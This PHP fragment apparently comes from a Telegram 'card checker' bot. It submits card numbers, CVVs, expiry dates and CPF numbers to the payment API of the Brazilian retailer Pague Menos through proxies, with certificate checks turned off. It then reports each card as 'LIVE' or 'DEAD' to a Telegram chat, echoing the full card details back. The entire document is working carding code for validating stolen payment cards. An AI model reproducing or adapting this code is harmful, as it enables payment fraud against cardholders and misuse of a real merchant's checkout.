curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/plain, */*',
'content-type: application/json;charset=UTF-8',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
'origin: https://io.vtexpayments.com.br',
'referer: https://io.vtexpayments.com.br/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '[{"hasDefaultBillingAddress":true,"installmentsInterestRate":0,"referenceValue":1649,"bin":"'.$bin.'","accountId":null,"value":1649,"tokenId":null,"paymentSystem":"2","isBillingAddressDifferent":false,"fields":{"holderName":"Viny Godzin","cardNumber":"'.$cc.'","validationCode":"'.$cvv.'","dueDate":"'.$mes.'/'.$ano.'","document":"'.$cpf.'","addressId":"a393e2dd1d6a470b995da7a7360c93e3","bin":"'.$bin.'"},"installments":1,"chooseToUseNewCard":true,"id":"PAGUEMENOS00030-paguemenos00030","interestRate":0,"installmentValue":1649,"transaction":{"id":"'.$id.'","merchantName":"PAGUEMENOS00030"},"installmentsValue":1649,"currencyCode":"BRL","originalPaymentIndex":0,"groupName":"creditCardPaymentGroup"}]');
echo $data1 = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paguemenos.com.br/api/checkout/pub/gatewayCallback/'.$orderId.'');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxy");
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./paguemenos.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
'content-type: application/json; charset=UTF-8',
'x-requested-with: XMLHttpRequest',
'origin: https://www.paguemenos.com.br',
'referer: https://www.paguemenos.com.br/checkout/'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$data1 = curl_exec($ch);
$Retorno = getStrss($data1, 'returnCode:',' - cardToken');

if ($data1 == NULL) {
    //  echo "<strong class='hg-green'>LIVE ✓</strong> $lista | $resultbin | <strong class='hg-blue'>Transação autorizada (00)</strong>";
    $delay00 = microtimeFormat($starttime);
    $result00 = urlencode("<b>Status -» [LIVE CVV O CCN🟩] 
••• 💳CC ->> <code>$cc|$mes|$ano|$cvv</code>
Response -» <code>LIVE CC CVV or CNN</code>
Gateway -» Auth Brazil
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $brand
<b>Type -»</b> $type
<b>Issuers Contact -»</b> UNKNOWN
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
    $su00 = reply_to2($chat_id,$message_id_1,$keyboard,$result00);
    $result01 = json_decode($su00, TRUE);
    $message_id_2 = $respon2['result']['message_id'];
}elseif(strpos($data1, 'message')){
    //  echo "<strong class='hg-red'>DIE ✗</strong> | $lista | <strong class='hg-yellow'>$Retorno</strong>";
    $delay00 = microtimeFormat($starttime);
    $result00 = urlencode("<b>Status -» [DEAD🟥] 
••• 💳CC ->> <code>$cc|$mes|$ano|$cvv</code>
Response -» <code>$data1</code>
Gateway -» Auth Brazil
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $brand
<b>Type -»</b> $type
<b>Issuers Contact -»</b> UNKNOWN
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
    $su00 = reply_to2($chat_id,$message_id_1,$keyboard,$result00);
    $result01 = json_decode($su00, TRUE);
    $message_id_2 = $respon2['result']['message_id'];
}
}
// function getStrss2($string, $start, $end){
//     $str = explode($start, $string);
//     $str = explode($end, $str[1]);
//     return $str[0];
// }
?>